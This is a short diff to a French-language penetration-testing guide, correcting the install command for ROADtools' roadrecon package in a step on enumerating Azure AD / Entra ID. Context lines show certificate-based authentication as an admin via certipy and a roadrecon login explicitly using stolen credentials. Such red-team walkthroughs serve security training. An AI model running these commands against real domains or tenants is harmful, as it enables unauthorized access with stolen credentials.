@@ -409,8 +409,8 @@ certipy auth -pfx a1b2c3d4.pfx -dc-ip 10.0.0.1 -domain corp.local -username admi
 ### Étape 5 : Énumérer Azure AD / Entra ID avec ROADtools
 
 ```bash
-# Installer ROADtools
-pip3 install roadtools
+# Installer ROADrecon (paquet PyPI du projet ROADtools)
+pip3 install roadrecon
 
 # Authentification (avec des credentials volées)
 roadrecon auth -u utilisateur@corp.onmicrosoft.com -p motdepasse
